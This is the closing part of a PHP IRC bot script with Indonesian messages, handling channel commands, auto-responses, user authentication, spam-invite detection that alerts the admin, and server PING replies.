                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama ' . CRL);
               }
               elseif ($com[3]==':!topic' && $com[4] && $chan) {
                 $msg = strstr($data,":!topic");
                 $msg = str_replace(":!topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PING 12886241614'. CRL);
                 $msgdelay = 0;
                 foreach ($helptext as $baris){
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(2) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 unset($baris);
                 unset($msgdelay);
               }
               /*** AUTO RESPONSE COMMAND NIKO **/
               elseif ($com[3]==':!ngomong') {
                 $ngomong = TRUE;
                 $autowelcome = TRUE;
                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION seneng boleh ngomong lagi! Makasi BoZz'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue ngomong deh. ' . CRL); }
               }
               elseif ($com[3]==':!diam') {
                 $ngomong = FALSE;
                 $autowelcome = FALSE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION Di Suruh Diam oleh my Bozz :('. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue diem deh. ' . CRL); }
               }
               elseif ($com[3]==':!wb') {
                 $wbn = $com[4];
                 $msg = strstr($data,":!wb");
                 $msg = str_replace(":!wb $wbn ","",$msg);
                 $nickwb[] = array($wbn,$msg);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :Seep! '.$wbn.' ('.$msg.')'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Seep! '.$wbn.' ('.$msg.')'. CRL); }
               }
             }
             else { fputs($fp,'NOTICE '.$dNick.' :Mohon auth dulu! Ketik: auth <password> '. CRL); }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand) && $log=="on") {
             fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

cayank();

?>













